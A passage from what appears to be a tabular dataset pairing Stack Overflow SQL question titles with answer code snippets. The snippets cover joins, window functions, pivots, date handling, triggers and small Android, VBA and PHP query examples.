       Dept_id, Dept_name, Emp_id, Emp_Name
FROM Emp ) t on t.Dept_id = d. Dept_id
"
18559,19993,Deleting from Android SQLite Database,"Cursor cursor = db.query(DATABASE_TABLE, null, null, null, null, null, null); 

    if(cursor.moveToFirst()) {
        long rowId = cursor.getLong(cursor.getColumnIndex(KEY_ROWID)); 

        db.delete(DATABASE_TABLE, KEY_ROWID +  ""="" + rowId, null);
   }
"
12414,22157,webmatrix - sql query using DateTime.Now,"var lastweek = DateTime.Now.AddDays(-7);
"
35678,50499,Oracle trigger: conditional statement,"CREATE OR REPLACE TRIGGER trg_new_reorder_stock
  AFTER INSERT OR UPDATE ON stock_inventory
BEGIN
  FOR x IN (SELECT *
              FROM stock_inventory
             WHERE s_quantity <= 10)
  LOOP
    dbms_output.put_line( 'Reorder ' || x.p_id || ' it has only ' || x.s_quantity || ' units remaining.' );
  END LOOP;
END;
"
35848,11830,Is having an 'OR' in an INNER JOIN condition a bad idea?,"SELECT  *
FROM    maintable m
JOIN    othertable o
ON      o.parentId = m.id
UNION
SELECT  *
FROM    maintable m
JOIN    othertable o
ON      o.id = m.parentId
"
18818,25367,Postgresql search using only alphanumeric characters,"select *
from table
where translate(lower(WhatIDo), translate(lower(WhatIDo), 'abcdefghijklmnopqrstuvwxyz', ''), '') = 'stacks'
"
318,53901,Fill in all dates in certain date ranges from another using calendar table,"SELECT convert(varchar,d.Date, 105) FROM dbo.Days d
JOIN dbo.Holidays H ON d.Date BETWEEN h.DateFrom AND h.DateTo
"
10185,44494,Need a sql query for this scenario,"SELECT id FROM mytable WHERE 
CASE 
     WHEN EXISTS( SELECT 1 FROM mytable WHERE region='DL' AND country='IND'
                   AND restaurant='xyz' AND locationcode='100')
       THEN region='DL' AND country='IND' AND restaurant='xyz' AND locationcode='100'
     WHEN EXISTS( SELECT 1 FROM mytable WHERE region='DL' AND country='IND')
       THEN region='DL' AND country='IND'
     WHEN EXISTS( SELECT 1 FROM mytable WHERE region='DL' )
       THEN region = 'DL';
     END; 
"
33766,20943,Substring sql nvarchar value from start to first non-int character,"SELECT LEFT(ColumnName,PATINDEX('%[^0-9]%', ColumnName+'a')-1) FROM TABLE
"
38301,37423,SQL Server order by closest value to zero,"ROW_NUMBER () OVER (
  PARTITION BY PersonID 
  ORDER BY abs(datediff(dd, dischargedate, surveydate)) asc
) AS rn
"
12504,32138,SQL Select questions,"-- Sample data from the question.
declare @TestData table ([Date] datetime, [Nbr] int, [NewValue] char(3), [OldValue] char(3));
insert @TestData values
    ('2015-05-20 14:23:08', 123, 'abc', 'xyz'),
    ('2015-05-20 15:02:10', 123, 'xyz', 'abc'),
    ('2015-05-21 08:10:02', 123, 'xyz', 'pqr'),
    ('2015-05-21 10:10:05', 456, 'lmn', 'ijk');

with [SequencingCTE] as
(
    select *,
        -- [OrderAsc] will be 1 if and only if a record represents the FIRST change 
        -- for a given [Nbr] on a given day.
        [OrderAsc] = row_number() over (partition by convert(date, [Date]), [Nbr] order by [Date]),

        -- [OrderDesc] will be 1 if and only if a record represents the LAST change
        -- for a given [Nbr] on a given day.
        [OrderDesc] = row_number() over (partition by convert(date, [Date]), [Nbr] order by [Date] desc)
    from
        @TestData
)

-- Match the original value for each [Nbr] on each day with the final value of the
-- same [Nbr] on the same day, and get only those records where an actual change
-- has occurred.
select
    [Last].*
from
    [SequencingCTE] [First]
    inner join [SequencingCTE] [Last] on
        convert(date, [First].[Date]) = convert(date, [Last].[Date]) and
        [First].[Nbr] = [Last].[Nbr] and
        [First].[OrderAsc] = 1 and
        [Last].[OrderDesc] = 1
where
    [First].[OldValue] != [Last].[NewValue];
"
3608,70334,SQL to move rows up or down in two-table arrangement,"WITH x AS (
  SELECT t2.itmid, t2.ord
  FROM   dbo.test_db_002 t1
  LEFT   JOIN dbo.test_db_003 t2 ON (t1.id = t2.itmid)
  WHERE  t1.name = 'John'  -- must be unique, or query by id ...
  )
  , y AS (
  SELECT TOP 1
         t.itmid, t.ord
  FROM   dbo.test_db_003 t, x
  WHERE  t.ord < x.ord     -- smaller ord = ""above""
  ORDER  BY t.ord DESC
  )
UPDATE dbo.test_db_003 SET ord = z.ord
FROM (
   SELECT x.itmid, y.ord FROM x,y
   UNION ALL
   SELECT y.itmid, x.ord FROM x,y
   ) z
WHERE  dbo.test_db_003.itmid = z.itmid   
"
10673,58468,format specific values FOR XML PATH,"SELECT 
  Name,
  CASE WHEN Name='n2' THEN ROUND(Value,7) ELSE Value END AS Value
... 
"
22855,6886,Why SQLite index is not speed up query?,"INSERT INTO KeysTable (KeyText, Id)
  SELECT KeyText
       , KeysTable.ID  
  FROM KeysTable
    INNER JOIN StatTable 
      ON KeysTable.ID = StatTable.Key_ID
  WHERE StatTable.StatCommandCode = 4 
"
34727,6027,Retrieve previous row to subtract from current row by date,"select NAV_date, NAV_value, (NAV_value / prev_value) - 1
from (select t.*,
             (select top 1 NAV_value
              from YOURTABLENAMEGOESHERE as t2
              where t2.NAV_date < t.NAV_date
              order by t2.NAV_date desc
             ) as prev_value
      from YOURTABLENAMEGOESHERE as t
     ) as t
"
37633,34417,Pull the next row of a sort based on a previous value,"with dep_tree  (groupno, depend, group_order) as (
   select groupno, depend, 1 as group_order
   from group_list
   where depend = 0

   union all 

   select c.groupno, c.depend, p.group_order + 1
   from group_list c, 
        dep_tree p 
   where p.groupno = c.depend
)
select group_order, groupno, depend
from dep_tree
order by group_order;
"
37041,73741,Working of MySQL Query,"SELECT * MyTable 
where Column1 not in (5, 8, 12)
and Column2 <> 300 
and Column3 = 200;
"
28728,46963,Difference between values in consecutive rows for unique ID's,";with cte AS (SELECT *,ROW_NUMBER() OVER(PARTITION BY AccountNumber ORDER BY ValueDate) AS RN 
              FROM YourTable)
SELECT a.*,a.Amount - b.Amount AS Diff
FROM cte a
LEFT JOIN cte b
  ON a.AccountNumber = b.AccountNumber
  AND a.RN = b.RN -1
"
30348,49464,Converting row values into ColumnName,"SELECT [id],[b_id],[Date],
       [t_id],[p_id],[comments]
FROM   (SELECT Row_number()OVER(partition BY name ORDER BY [values]) rn,*
        FROM   SampleTbl) A
       PIVOT (Min ([Values])
             FOR Name IN ([id],[b_id],[Date],
                          [t_id],[p_id],[comments])) piv 
"
35976,9627,Getting only one row in outer join using oracle,"WITH
  x AS( SELECT 1 id FROM dual UNION SELECT 2 FROM dual UNION SELECT 3 FROM dual ),
  y AS( SELECT 1 id, 1 nr, 'B' code FROM dual
        UNION SELECT 1, 2, 'A'  FROM dual
        UNION SELECT 2, 2, 'A' FROM dual
) -- end of test data
SELECT  *
FROM    (
        SELECT  x.id, y.nr, y.code, ROW_NUMBER() OVER (PARTITION BY x.id ORDER BY y.nr) AS rn
        FROM    x
        LEFT OUTER JOIN y
        ON   y.id = x.id
)
WHERE rn = 1
"
21378,33508,SQL query - unique values with multiple condition," SELECT COUNT(DISTINCT Test_Result) as 'Total' 
    ,COUNT(DISTINCT CASE WHEN Test_Result='Pass' THEN serial_no  END) AS 'Passed'
    ,COUNT(DISTINCT CASE WHEN Test_Result='Fail' THEN serial_no  END) AS 'Failed'
 FROM [Optima_Test_Results].[dbo].[Optima PreChamber Test]
 WHERE 
DATEADD(dd, 0, DATEDIFF(dd, 0, Created_Date)) = DATEADD(dd, 0, DATEDIFF(dd, 0, GETDATE()))
"
17513,62314,I have to write a very interesting query which calculates null values and rows with values,"SELECT
  COUNT(Col1)+COUNT(Col2)+COUNT(Col3)+
  COUNT(Col4)+COUNT(Col5)+COUNT(Col6) AS ValuesCount,

  6*COUNT(*)-COUNT(Col1)-COUNT(Col2)-COUNT(Col3)-
  COUNT(Col4)-COUNT(Col5)-COUNT(Col6) AS NullCount
FROM data
GROUP BY id
"
18022,34854,Select the amount of billable hours and non-billable hours,"Select e.Name, Sum( i.Hours) as TotalHours,
       sum(case when i.ToBeBilled = 1 then i.Hours else 0 end) as Billable,
       sum(case when i.ToBeBilled = 0 then i.Hours else 0 end) as NonBillable
From Employee e Inner Join
     TimeSheet ts
     On ts.Employee_Id =  e.Id Inner Join
     Imputation i
     on i.TimeSheetID = ts.TimeSheetId
Group By e.Name, e.id
Order By Employee.Name;
"
37234,35255,TNSNames.ora entries,"NAMES.DEFAULT_DOMAIN = world
"
4688,19065,MySQL select * from last 5 days from a datetime field,"Select 
* 
from 
'myTable' 
where 'datetime' >=
      (
           select  
          `datetime` 
          from myTable 
          group by DATE(`datetime`) 
          order by `datetime` desc 4,1
        )
"
19503,1272,Convert time stored as number to string,"SELECT TO_DATE(TO_CHAR(1600,'0000'),'HH24MI') FROM DUAL;
"
24435,23922,Query Process Order,"select
  case when exists
  (
    select *
    from events as this_step
    where exists
    (
      select *
      from events as earlier_step
      where cast(earlier_step.dates as datetime) + cast(earlier_step.logtime as datetime) <
            cast(this_step.dates as datetime) + cast(this_step.logtime as datetime)
      and earlier_step.step > this_step.step
    )
  ) then 
    'ERROR'
  else
    'OKAY'
  end as status;
"
29286,41834,"Two SELECT statements in one stored procedure, one supplying input for another and the other returning more than one row","WITH first AS 
(
  SELECT val1, val2, val3, val4
    FROM Table1
   WHERE 1 = 1
), second AS
(
  SELECT val1,
         MIN(CASE WHEN rnum = 1 THEN val5 END) val51,
         MIN(CASE WHEN rnum = 1 THEN val6 END) val61,
         MIN(CASE WHEN rnum = 2 THEN val5 END) val52,
         MIN(CASE WHEN rnum = 2 THEN val6 END) val62,
         MIN(CASE WHEN rnum = 3 THEN val5 END) val53,
         MIN(CASE WHEN rnum = 3 THEN val6 END) val63
    FROM
  (
    SELECT t2.val1, val5, val6, 
           ROW_NUMBER() OVER (PARTITION BY t2.val1 ORDER BY (SELECT 1)) rnum
      FROM Table2 t2 JOIN first f
        ON t2.val1 = f.val1
  ) a
   GROUP BY val1
)
SELECT * 
  FROM first f JOIN second s
    ON f.val1 = s.val1
"
36042,32767,T-SQL statement won't accept a variable as role name in a grant statement,"declare @sql nvarchar(max)
set @sql = 'Grant select on dbo.someTable to ' + @RoleName  -- protect if required
EXEC (sql)
"
587,11267,What character set is this?,"unix shell prompt> echo Alain LefÃƒÆ’Ã‚Â¨vre | 
iconv -f utf-8 -t cp1252 | 
iconv -f utf-8 -t cp1252 | 
iconv -f utf-8 -t cp1252

Alain Lefèvre

unix shell prompt>
"
13409,70303,IN operator with Inner query SQL,"SELECT p.*
FROM `posts` p
WHERE exists (select 1
              from `users` u
              where u.user_id = ? and find_in_set(p.language, u.possible_languages)
             )
"
3113,38596,SQL Query to comparing the minutes in SQL 2008 R2 server,"select *From Table where DATEPART(hh,yourdatefield)>=17 and and convert(date,yourdatefield,103)='2014-04-03'
"
26720,70295,How to get list of all materialized views in oracle,"SELECT *
FROM  all_snapshots;
"
33195,58264,"""Tag"" searching/exclusion query design issue","select p.*
from post p
left outer join (
    select pt.post_id    
    from post_tag pt
    inner join tag t on pt.tag_id = t.id
    where t.title in ('UVW', 'XYZ')
) notag on p.id = notag.post_id 
inner join (
    select pt.post_id    
    from post_tag pt
    inner join tag t on pt.tag_id = t.id
    where t.title in ('ABC', 'DEF')
    group by pt.post_id
    having count(distinct t.title) = 2
) yestag on p.id = yestag.post_id 
where notag.post_id is null
--add additional WHERE filters here as needed
"
5522,68734,Is there any modified query for this query:,"$sub = Studentacademicinfo::whereClass($cat)->whereSection($section)->get();
"
18354,23786,How do I get the value associated with a MIN or MAX,";WITH CTE_Transactions AS (
    SELECT DISTINCT
        patient_id, 
        clinic, 
        SUM(amount) OVER (PARTITION BY patient_id, clinic) AS production,
        FIRST_VALUE(tran_date) OVER (PARTITION BY patient_id, clinic ORDER BY tran_date) AS first_visit,
        FIRST_VALUE(provider_id) OVER (PARTITION BY patient_id, clinic ORDER BY tran_date) AS first_provider_id,
        LAST_VALUE(tran_date) OVER (PARTITION BY patient_id, clinic ORDER BY tran_date) AS last_visit,
        LAST_VALUE(provider_id) OVER (PARTITION BY patient_id, clinic ORDER BY tran_date) AS last_provider_id,
        ROW_NUMBER() OVER (PARTITION BY patient_id, clinic ORDER BY tran_date) AS row_num
FROM Transactions
WHERE impacts='P'
)
SELECT
    w.patient_id, 
    w.clinic, 
    p.city, 
    p.state, 
    p.zipcode, 
    p.sex, 
    w.production,
    w.first_visit, 
    w.last_visit
FROM
    CTE_Transactions W
LEFT JOIN Patient P ON
    W.patient_id = P.patient_id AND
    W.clinic = P.clinic
INNER JOIN Provider FIRST_PROV ON
    FIRST_PROV.provider_id = W.first_provider_id
INNER JOIN Provider LAST_PROV ON
    LAST_PROV.provider_id = W.last_provider_id
WHERE
    W.row_num = 1
"
35211,61936,Help with SQL Query,"select  *
from    Table2 t2
left join
        Table1 t1
on      t1.id = t2.id
where   t1.id is not null
        or (isActive = 1 and status is not null)
"
31352,72366,Database design for comments and replies,"select c.comment, r.comment as reply
from comment as c, comment as r, replyto as rt
where c.ID = rt.CommentID
and r.ID = rt.ReplyID
"
21866,49837,How to SELECT and Count range of rows in a Table,"select sum(`project-bug` between 0 and 500) as 0_500,
       sum(`project-bug` between 501 and 1000) as 501_1000,
       sum(`project-bug` between 1001 and 1500) as 1001_1500,
       sum(`project-bug` between 1501 and 2000) as 1501_2000
from projects
"
1646,54188,Mysql join order by,"SELECT u.*
FROM user_prefs u
   JOIN categories cat ON u.category_id = cat.category_id
WHERE p.user_id = 10 /* Put user id here*/
ORDER BY cat.name
"
24182,30948,How to write a SQL query that will Count two types of values in the Same Column of one Table?,"select User,    
      Count(case when item = 'A' then 1 end) as `Count of A`,
      Count(case when item = 'B' then 1 end) as `Count of B`
From yourtable
Group by User
"
25,502,Sqlite select max query and sorting,"select * 
from table
where product_price = (SELECT max(product_price) FROM table)
order by id desc
limit 1
"
24329,75364,Subdivide timestamps into 3 timeslots,"select 
    case
        when datepart(Hh, dt) >= 5 AND datepart(Hh, dt) < 13 then 1
        when datepart(Hh, dt) >= 13 AND datepart(Hh, dt) < 21 then 2
        when datepart(Hh, dt) < 5 OR datepart(Hh, dt) >= 21 then 3
    end
from myTable
"
3659,16942,sql self join problems how to find the duplicates from same table,"select s.sid, s.sname
from student s
join enroll e on e.sid = s.sid
join course c on c.cno = e.cno and c.cname='computer science'
join enroll e1 on e1.sid = s.sid
join course c1 on c1.cno = e1.cno and c1.name='maths'
"
21489,29594,SQL Query - Sum at higher level for the same table,"SELECT date, resource_name, transfer_resource_name, SUM(calls) as calls,
       SUM(SUM(calls)) OVER (PARTITION BY resource_name) as total_calls 
FROM abc
GROUP BY date, resource_name, transfer_resource_name;
"
11280,14741,sql replace cell value with column name and avoid null values,"select  PF
,       HireDate
,       replace(
            iif(Writing is null;'';'Writing, ') +
            iif(Swimming is null;'';'Swimming, ') +
            iif(KickOff is null;'';'KickOff, ') +
            iif(Shopping is null;'';'Shopping, ') + '$';
            ', $'; '')
from    Agents a
join    Skills s
on      s.PF = a.PF
"
37848,5861,"mysql count and grouping,ordering","SELECT  name ,   COUNT(*) AS `number`
FROM your_table
GROUP BY name
ORDER BY `number` DESC, name;
"
32452,2771,Match exact values on oracle join,"to_char(application.appId) = report.externalAppId
"
26520,62061,SQL Joins . One to many relationship,"select a.UserID, a.UserName, 
    coalesce(aAge.Age, a.Age),
    coalesce(aSalary.Salary, a.Salary)
from [Table 1] a
outer apply (
    select Age
    from [Table 2] x
    where x.UserID = a.UserID 
    and x.Age is not null
    and not exists (
        select 1
        from [Table 2] y
        where x.UserID = y.UserID
        and y.Id > x.Id
        and y.Age is not null
    )
) aAge,
outer apply (
    select Salary
    from [Table 2] x
    where x.UserID = a.UserID 
    and x.Salary is not null
    and not exists (
        select 1
        from [Table 2] y
        where x.UserID = y.UserID
        and y.Id > x.Id
        and y.Salary is not null
    )
) aSalary
"
5629,14372,How can I count an SQL field for the number of results within a range?,"SELECT CASE WHEN OverdueBy >= 50 THEN '50+' 
WHEN OverdueBy >= 40 and OverdueBy < 50 THEN '40-49'
WHEN OverdueBy >= 30 and OverdueBy < 40 THEN '30-39'
.....
ELSE 'Less than that' END AS OverdueRange,
Count(*) as OverdueCount,
Sum(Amount) as [Total Amount]
From yourtable
group by CASE WHEN OverdueBy >= 50 THEN '50+' 
WHEN OverdueBy >= 40 and OverdueBy < 50 THEN '40-49'
WHEN OverdueBy >= 30 and OverdueBy < 40 THEN '30-39'
.....
ELSE 'Less than that' END 
"
9016,51680,sub string for non English languages,"SELECT CHAR_LENGTH('Época Cosméticos_T2') AS _char_length
     , LENGTH('Época Cosméticos_T2') AS _length

_char_length  _length  
------------  -------
          19       21
"
13377,12315,SQL how to check database data validity?,"DBCC CHECKCONSTRAINTS WITH ALL_CONSTRAINTS
"
27024,188,Access SQL query: find the row with the most recent date for each distinct entry in a table,"SELECT ID, Value,As_of 
from yourTable a inner join 
          (SELECT ID, MAX(As_of) as As_of 
          from yourTable group by ID) b 
on a.ID=b.ID and a.As_of = b.As_of
"
18719,49923,SQL to group based on the counts of a column,"SELECT DISTINCT
  num_of_statuses = COUNT(*),
  count           = COUNT(*) OVER (PARTITION BY COUNT(*))
FROM atable
GROUP BY id
"
9279,7802,Select from a table where a condition is fulfilled and another is not,"select students.name, students.group, students.specialization
from applicants ap
inner join students on students.id = ap.student_id
inner join scolarships on scolarships.scolarship_id = ap.scolarship_id
where 
ap.scolarship_id = 2
and not exists(
 select 1 from applicants ap1
 where 
 ap.student_id = ap1.student_id
 and ap1.scolarship_id = 4
)
;
"
167,13564,"Check for same index in two arrays: IN (1,2,3) AND IN (A, B, C)","Select
  id, title
From
  `questions` q
Where
  (q.id = 2 And q.answer = 'Christoffer Columbus') Or
  (q.id = 4 And q.answer = 'Arnold Schwarzenegger')
;
"
20237,63454,Display only rows that do not match the control table,"select t1.*
from table1 t1
where NOT EXISTS (select 1 from ControlTable ct
                  where t1.Source_DB = ct.DB_NM
                    and t1.Source_TBL = ct.Source_TBL
                    ...
                    and ct.INCLUDE_FLAG = 'N')
"
13032,67443,VBA update query,"DoCmd.RunSQL ("" SELECT * FROM tbltesting "" & _
                ""WHERE empid= "" & Me.txtEmpId.Value & _
                "" and testid= "" & Me.txtAutoNumber.Value & "";"")
"
17260,21427,select table name to select data from,"SELECT 
    tbl3.dataid,
    tbl3.datasource,
    COALESCE(tbl1.important_data, tbl2.important_data)  important_data
    COALESCE(tbl1.another_thing, tbl2.another_thing) another_thing,
    COALESCE(tbl1.something_completly_different, tbl2.something_completly_different) something_completly_different
FROM tbl3
LEFT JOIN tbl2 ON  tbl2.dataid = tbl3.dataid AND tbl3.datasource = 'tbl2'
LEFT JOIN tbl1 ON  tbl1.dataid = tbl3.dataid AND tbl3.datasource = 'tbl1'
"
37795,31786,IF (SUBQUERY) = SOMETHING SELECT A ELSE SELECT B MySql,"SELECT *
FROM
  (SELECT 1,2,3) s
WHERE
  (SELECT COUNT(*) FROM TABLE WHERE COLUMN=VALUE) = 0
UNION ALL
SELECT
  A,B,C
FROM
  TABLE
WHERE
  COLUMN=VALUE
"
30716,56667,Add Cascade to exist table in SQL Server,"ALTER TABLE someTable DROP FOREIGN KEY someID;
ALTER TABLE someTable ADD FOREIGN KEY (someID) REFERENCES someOtherTable (ID) ON DELETE CASCADE;
"
4338,10052,SQL query join issue,"SELECT m.Name FROM Main m LEFT JOIN Net n ON n.AppID=m.AppID LEFT JOIN Env e ON e.AppID=m.AppID;
"
29650,20952,How To Get the Last Record in a MySQL Group,"select q.*, t.consultant
from (select driver, count(*) as quotecount, min(date) as FirstDate, max(date) as lastdate
      from t
      group by driver
     ) q join
     t
     on t.driver = q.driver and t.date = q.lastdate
"
36309,1103,SQL server simple query,"CREATE TABLE #tb_user (
  int_id_user INT NOT NULL PRIMARY KEY,
  username varchar(20) NULL
)
GO

/* returns NO ROWS because #tb_user contains no rows */
select coalesce(username,'its null') from #tb_user where int_id_user = 0
GO

/* returns 'its null' if username IS NULL or int_id_user does not exist in the table */
SELECT COALESCE(
    (select username from #tb_user where int_id_user = 0),
    'its null'
) AS username
GO
"
181,55212,SQL Server: how to get this result from this table (example inside),"select week      = w.week ,
       name      = n.name ,
       sum_total = coalesce( sum( d.total ) , 0 )
from       ( select distinct week from my_table ) w
cross join ( select distinct name from my_table ) n
left  join my_table d on d.week = w.week
                    and  d.name = n.name
group by w.week ,
         n.name
order by 1,2
"
14007,24847,Performing a function on rows with matching IDs,"select id, (max(date) - min(date)) as daydiff
from t
group by id;
"
15162,31216,To make a SQL?,"SELECT * 
FROM table 
WHERE Name LIKE '%@name%'
AND Status LIKE '%@status%'
AND [Activities Performed] LIKE '%@activities%'
AND Region LIKE '%@region%'
"
10451,9781,Ordering a group by in sql,"SELECT 
     userid, 
     max(time)
FROM
     useractions
GROUP BY 
     userid
"
15545,67619,Extracting time and convert to column then group by date,"SELECT DATE_Field, 
MAX(CASE STATUS WHEN 'A' THEN Date_Time END) A,
MAX(CASE STATUS WHEN 'B' THEN Date_Time END) B
FROM 
(
SELECT CONVERT(Date,DateField,101) Date_Field, 
CONVERT(Time,DateField) Date_Time, Status
FROM YourTable
) v
GROUP BY DATE_Field
"
4552,66586,How to check if something is not in the table,"SELECT l.levcode, 
       levnaam, 
       levadres, 
       levwoonplaats 
FROM   leverancier l 
WHERE  l.levcode NOT IN (SELECT b.levcode 
                         FROM   bestelling b) 
"
23197,14296,querying how many weeks between a date range and showing them their dates,"SQL> WITH DATA AS
  2    (SELECT to_date('01/01/1994', 'DD/MM/YYYY') date1,
  3      to_date('31/12/1994', 'DD/MM/YYYY') date2
  4    FROM dual
  5    )
  6  SELECT the_week,
  7    listagg(the_date, ' until ') within GROUP (
  8  ORDER BY to_date(the_date, 'DD/MM/YYYY')) the_date_range
  9  FROM
 10    (SELECT the_week,
 11      the_date,
 12      row_number() over(partition BY the_week order by the_week, to_date(the_date, 'DD/MM/YYYY')) rn
 13    FROM
 14      (SELECT TO_CHAR(date1+level-1, 'WW') the_week ,
 15        TO_CHAR(date1      +level-1, 'DD/MM/YYYY') the_date
 16      FROM data
 17        CONNECT BY LEVEL <= date2-date1+1
 18      )
 19    )
 20  WHERE rn in( 1, 7)
 21  GROUP BY the_week
 22  /

TH THE_DATE_RANGE
-- ---------------------------------------------
01 01/01/1994 until 07/01/1994
02 08/01/1994 until 14/01/1994
03 15/01/1994 until 21/01/1994
04 22/01/1994 until 28/01/1994
05 29/01/1994 until 04/02/1994
06 05/02/1994 until 11/02/1994
07 12/02/1994 until 18/02/1994
08 19/02/1994 until 25/02/1994
09 26/02/1994 until 04/03/1994
10 05/03/1994 until 11/03/1994
11 12/03/1994 until 18/03/1994
12 19/03/1994 until 25/03/1994
13 26/03/1994 until 01/04/1994
14 02/04/1994 until 08/04/1994
15 09/04/1994 until 15/04/1994
16 16/04/1994 until 22/04/1994
17 23/04/1994 until 29/04/1994
18 30/04/1994 until 06/05/1994
19 07/05/1994 until 13/05/1994
20 14/05/1994 until 20/05/1994
21 21/05/1994 until 27/05/1994
22 28/05/1994 until 03/06/1994
23 04/06/1994 until 10/06/1994
24 11/06/1994 until 17/06/1994
25 18/06/1994 until 24/06/1994
26 25/06/1994 until 01/07/1994
27 02/07/1994 until 08/07/1994
28 09/07/1994 until 15/07/1994
29 16/07/1994 until 22/07/1994
30 23/07/1994 until 29/07/1994
31 30/07/1994 until 05/08/1994
32 06/08/1994 until 12/08/1994
33 13/08/1994 until 19/08/1994
34 20/08/1994 until 26/08/1994
35 27/08/1994 until 02/09/1994
36 03/09/1994 until 09/09/1994
37 10/09/1994 until 16/09/1994
38 17/09/1994 until 23/09/1994
39 24/09/1994 until 30/09/1994
40 01/10/1994 until 07/10/1994
41 08/10/1994 until 14/10/1994
42 15/10/1994 until 21/10/1994
43 22/10/1994 until 28/10/1994
44 29/10/1994 until 04/11/1994
45 05/11/1994 until 11/11/1994
46 12/11/1994 until 18/11/1994
47 19/11/1994 until 25/11/1994
48 26/11/1994 until 02/12/1994
49 03/12/1994 until 09/12/1994
50 10/12/1994 until 16/12/1994
51 17/12/1994 until 23/12/1994
52 24/12/1994 until 30/12/1994
53 31/12/1994

53 rows selected.

SQL>
"
3680,17795,How to write an update query that sets a value based on weather a subquery is empty or not,"update task_groups tg set tg.status = 0 
where exists (select * from tasks where task_group = tg.keyid and status = 0);
"
20207,60593,Find duplicate columns that have values that end with same last four digits - SQL,"select ""person_number"", ""name"", rn, zero_count
from
(
  select ""person_number"", 
         ""name"", 
         substr(""person_number"", 1, 1),
         count(1) over (partition by substr(""person_number"",-4)) as Cnt,
         SUM(case 
             when substr(""person_number"", 1, 1)  = '0' then 1
             else 0 end) over (partition by substr(""person_number"",-4)) as zero_count,
          row_number() over (partition by substr(""person_number"",-4) order by ""name"") as rn
  from person
)
Where Cnt > 1
and zero_count > 0
ORDER BY substr(""person_number"",-4)
"
32112,61931,How to ignore a column in select statement if it has null vales,"declare @pc varchar(max)

select @pc = isnull(@pc + ',', '') + mnths
  from (
select distinct '[' + months + ']' mnths, convert(date, '1 ' + months + ' 1') ord
  from (select months
          from bor2
         group by months, WC_WARD_CATEGORY 
        having max(bor) is not null) as a ) as b order by ord

declare @sql varchar(max)
select @sql = '
select *
 from 
(
select WC_WARD_CATEGORY, months, bor
  from bor2
) as SourceTable 
PIVOT
(
max(bor) 
for months in (' + @pc + ')
) as PivotTable;'

execute(@sql)
"
39573,52704,Complex Iterating Query in SSRS 2008,"DECLARE @startDate datetime, @endDate datetime, @maxAllocation float, @dayCounter datetime

DECLARE @PeopleList TABLE (PersonId int, PersonName varchar(50))

SET @dayCounter = @startDate
WHILE @dayCounter <= @endDate
BEGIN
    INSERT INTO @PeopleList SELECT P.PersonId, P.PersonName FROM People P INNER JOIN Jobs J ON P.PersonId = J.AssignedPersonId
       WHERE J.StartDate <= @dayCounter AND J.StopDate >= @dayCounter
       GROUP BY P.PersonId, P.PersonName
       HAVING SUM(J.Allocation) <= @maxAllocation
    SET @dayCounter = DATEADD(DAY, 1, @dayCounter)
END

SELECT DISTINCT PersonId, PersonName FROM @PeopleList
"
15650,13250,How to query SQL Server 2008 database for first and last name and order by relevance?,"    CREATE VIEW [dbo].[vFullname] WITH SCHEMABINDING AS
    SELECT personID, FirstName + ' ' + LastName AS name 
    FROM dbo.person 

    WITH ranks AS(
    SELECT FT_TBL.personid 
        ,FT_TBL.name
        ,KEY_TBL.RANK
    FROM dbo.vfullname AS FT_TBL 
        INNER JOIN CONTAINSTABLE(vfullname, (name),
    'ISABOUT (""Smith"" WEIGHT (0.4), ""Smi*"" WEIGHT (0.2),
""John"" WEIGHT (0.3), ""Joh*"" WEIGHT (0.1))') AS KEY_TBL  
          ON FT_TBL.personid = KEY_TBL.[KEY]
    ) 
    SELECT
    r.personID,
    p.firstname,
    p.lastname,
    r.rank
    FROM ranks r INNER JOIN
    person p ON r.personID = p.personID
    ORDER BY rank DESC;
"
4751,36675,Find text in DB without knowing what table or column?,"Public Sub FindInAllTables(ByVal s As String)
    Dim db As DAO.Database, rs As DAO.Recordset
    Dim tdf As DAO.TableDef, fld As DAO.Field
    Dim pattern As String

    pattern = ""*"" & s & ""*""
    Set db = CurrentDb
    For Each tdf In db.TableDefs
        If (tdf.Attributes And dbSystemObject) = 0 Then
            On Error Resume Next
            Set rs = tdf.OpenRecordset(dbOpenSnapshot)
            If err.Number = 0 Then
                On Error GoTo 0
                Debug.Print ""Scanning ["" & tdf.Name & ""]  "";
                Do Until rs.EOF()
                    For Each fld In rs.Fields
                        If fld.Value Like pattern Then
                            Debug.Print
                            Debug.Print ""  Match in ["" & tdf.Name & ""].["" & _
                                fld.Name & ""] ===> """""" & fld.Value & """""""";
                            Exit Do
                        End If
                    Next fld
                    If rs.AbsolutePosition Mod 1000 = 999 Then
                        Debug.Print ""."";
                    End If
                    rs.MoveNext
                Loop
                Debug.Print
                rs.Close
            Else
                On Error GoTo 0
                Debug.Print ""Cannot open table ["" & tdf.Name & ""]""
            End If
        End If
    Next tdf
    db.Close
End Sub
"
16896,12892,How do I create a MySQL table when it has two foreign keys?,"CREATE TABLE users (
    user_id  INT NOT NULL PRIMARY KEY,
    name     VARCHAR(50) NOT NULL
) ENGINE=INNODB;

CREATE TABLE pictures (
    picture_id  INT NOT NULL PRIMARY KEY,
    filename    VARCHAR(255) NOT NULL,
    posted_by   INT NOT NULL,
    FOREIGN KEY (posted_by) REFERENCES users(user_id)    
) ENGINE=INNODB;

CREATE TABLE users_in_pictures (
    user_id     INT NOT NULL,
    picture_id  INT NOT NULL,
    PRIMARY KEY (user_id, picture_id),
    FOREIGN KEY (user_id) REFERENCES users(user_id),    
    FOREIGN KEY (picture_id) REFERENCES pictures(picture_id)    
) ENGINE=INNODB;
"
25206,68854,Get courses chosen by all students,"
SELECT * FROM course c
WHERE NOT EXISTS (
        SELECT * from student s
        WHERE NOT EXISTS (
                SELECT * from student_course cs
                WHERE cs.sid = s.sid
                AND cs.cid = c.cid
                )
        )
        ;
"
1908,73135,Can I iteratively update a single column multiple times - in a single statement?,"UPDATE OriginDetails
SET ErrMsg = ErrMsg + 
    CASE WHEN Origin NOT IN ('Pre-Design','Design','Development') THEN '|Invalid Origin' ELSE '' END
    + CASE WHEN Status NOT IN ('In Review','Approved') THEN '|Unrecognized Status'  ELSE '' END
    + CASE WHEN Priority NOT IN ('Critical','Medium','High')  THEN '|Priority check'  ELSE '' END
"
37337,23452,SQL Query Between Two Related Tables,"SELECT users.name FROM users
INNER JOIN has ON has.id = users.id
INNER JOIN accounts ON accounts.accNumber = has.accNumber
WHERE accounts.balance > 5000
"
35706,41615,omit the first 5 rows?,"    $query = ""SELECT *
            FROM ages
            LIMIT 100
            OFFSET 10"";
"
12923,62865,SQL Combine and/or Join two tables?,"Select DepartmentName, MonthNumber, CallType, PtCMedian, PtAMedian
From PtCView
LEFT JOIN PtAView ON
      PtCView.departmentName = PtAView.departmentName AND
